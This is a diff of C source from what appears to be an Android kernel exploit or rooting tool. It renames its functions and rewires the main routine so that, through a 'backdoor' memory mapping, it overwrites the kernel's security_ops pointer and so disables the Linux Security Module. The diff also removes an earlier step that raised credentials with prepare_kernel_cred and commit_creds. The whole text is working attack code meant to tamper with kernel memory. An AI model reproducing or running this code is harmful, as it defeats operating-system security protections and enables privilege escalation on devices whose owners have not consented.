@@ -30,7 +30,7 @@ static int n_check_reset_security_ops = (sizeof (check_reset_security_ops)
                                         / sizeof (check_reset_security_ops[0]));
 
 static bool
-run_unlock(void)
+do_reset_security_ops(void)
 {
   unsigned long int *p = backdoor_convert_to_mmaped_address((void *)reset_security_ops);
 
@@ -45,22 +45,16 @@ run_unlock(void)
     return false;
   }
 
-  *(unsigned long int *)security_ops = default_security_ops;
+  p = backdoor_convert_to_mmaped_address((void *)security_ops);
+  *p = default_security_ops;
+
   return true;
 }
 
 static bool
-run_exploit(void)
+do_unlock(void)
 {
-  void **ptmx_fsync_address;
-  unsigned long int ptmx_fops_address;
-  int fd;
   bool ret;
-
-  ptmx_fops_address = get_ptmx_fops_address();
-  if (!ptmx_fops_address) {
-    return false;
-  }
 
   if (!backdoor_open_mmap()) {
     printf("Failed to mmap due to %s.\n", strerror(errno));
@@ -69,21 +63,17 @@ run_exploit(void)
     return false;
   }
 
-  ret = run_unlock();
+  ret = do_reset_security_ops();
 
   backdoor_close_mmap();
+
   return ret;
 }
 
 int
 main(int argc, char **argv)
 {
-  if (!setup_creds_functions()) {
-    printf("Failed to get prepare_kernel_cred and commit_creds addresses.\n");
-    exit(EXIT_FAILURE);
-  }
-
-  if (!run_exploit()) {
+  if (!do_unlock()) {
     printf("Failed to unlock LSM.\n");
     exit(EXIT_FAILURE);
   }
